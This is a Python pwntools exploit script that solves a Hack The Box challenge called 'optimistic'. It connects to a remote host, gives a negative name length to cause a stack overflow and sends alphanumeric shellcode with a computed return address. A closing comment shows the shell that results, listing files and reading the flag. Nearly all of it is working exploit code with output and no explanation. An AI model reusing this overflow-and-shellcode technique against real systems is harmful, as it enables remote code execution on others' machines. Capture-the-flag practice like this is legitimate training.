from pwn import *

#io = process('./optimistic')
ip, port = '142.93.41.143', 30668
io = remote(ip, port)

io.sendlineafter('(y/n): ', 'y')
rbp = io.recvline().split()[-1]
io.sendlineafter('Email: ', '1')
io.sendlineafter('Age: ', '1')
io.sendlineafter('Length of name: ', '-1')

padding_size = 96+8
#shellcode = asm(shellcraft.sh())
#https://www.exploit-db.com/exploits/35205
shellcode = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
payload = shellcode + 'A'*(padding_size - len(shellcode)) + p64(int(rbp, 16)-96)
io.sendlineafter('Name: ', payload)
#gdb.attach(io, 'continue')
io.interactive()

'''
Thank you! We'll be in touch soon.
$ ls
flag.txt
optimistic
$ cat flag.txt
HTB{be1ng_negat1v3_pays_0ff!}
'''
